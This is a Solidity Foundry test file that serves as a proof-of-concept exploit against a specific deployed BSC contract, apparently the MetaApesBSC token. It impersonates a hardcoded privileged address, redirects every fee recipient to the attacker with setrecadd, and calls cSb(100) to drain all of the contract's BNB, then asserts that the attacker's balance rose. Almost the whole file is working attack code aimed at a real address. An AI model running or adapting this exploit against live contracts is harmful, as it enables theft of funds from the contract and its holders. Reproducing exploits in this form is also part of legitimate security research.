// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need the interface for MetaApesBSC
interface IMetaApesBSC {
    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;
    function cSb(uint256 aP) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // The hardcoded authorized address from Auth constructor
    address constant HARDCODED_AUTHORIZED = 0x061648f51902321C353D193564b9C8C2F720557a;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed, we'll impersonate the hardcoded authorized address
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance for comparison
        uint256 initialBalance = address(this).balance;

        // Impersonate the hardcoded authorized address
        vm.startPrank(HARDCODED_AUTHORIZED);

        // First, set all recipient addresses to attacker address
        // setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu)
        IMetaApesBSC(TARGET).setrecadd(
            address(this),  // mkwA
            address(this),  // krhF  
            address(this),  // mdhS
            address(this),  // wthT
            address(this),  // extR
            address(this),  // bbaK
            address(this)   // tfU - most important for cSb()
        );

        // Now drain all BNB from the contract to attacker (100%)
        IMetaApesBSC(TARGET).cSb(100);

        vm.stopPrank();

        // Verify we received BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should have increased");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
